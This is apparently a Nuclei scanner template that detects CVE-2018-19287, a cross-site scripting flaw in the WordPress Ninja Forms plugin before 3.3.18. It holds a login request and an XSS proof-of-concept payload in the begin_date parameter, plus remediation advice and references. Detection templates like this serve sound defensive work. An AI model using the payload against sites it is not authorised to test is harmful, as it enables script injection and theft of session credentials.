id: CVE-2018-19287

info:
  name: WordPress Ninja Forms <3.3.18 - Cross-Site Scripting
  author: theamanrawat
  severity: medium
  description: |
    WordPress Ninja Forms plugin before 3.3.18 contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in includes/Admin/Menus/Submissions.php via the begin_date, end_date, or form_id parameters. This can allow an attacker to steal cookie-based authentication credentials and launch other attacks.
  remediation: |
    Upgrade to the latest version of the Ninja Forms plugin (3.3.18 or higher) to mitigate this vulnerability.
  reference:
    - https://wpscan.com/vulnerability/fb036dc2-0ee8-4a3e-afac-f52050b3f8c7
    - https://wordpress.org/plugins/ninja-forms/
    - https://www.exploit-db.com/exploits/45880
    - https://nvd.nist.gov/vuln/detail/CVE-2018-19287
    - https://plugins.trac.wordpress.org/changeset/1974335/ninja-forms/trunk/includes/Admin/Menus/Submissions.php
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2018-19287
    cwe-id: CWE-79
    epss-score: 0.59729
    epss-percentile: 0.9745
    cpe: cpe:2.3:a:ninjaforma:ninja_forms:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: ninjaforma
    product: ninja_forms
    framework: wordpress
  tags: wp-plugin,wp,xss,authenticated,wpscan,edb,cve,cve2018,ninja-forms,wordpress

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In
      - |
        GET /wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date="><img+src%3Dx+onerror%3Dalert%28document.domain%29%3B%2F%2F&end_date&filter_action=Filter&paged=1&action2=-1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - 'Begin Date" value="\"><img src=x onerror=alert(document.domain);//">'

      - type: word
        part: header_2
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100c2fdc0c3e279743ebc01a4dfe1a95b5e9298bab94284bbbc5f418898686ec280022100d42b25b9a6c2d6afd102e93d8cd59e07f0fff54eedb5e5fc706d687d96a0abed:922c64590222798bb761d5b6d8e72950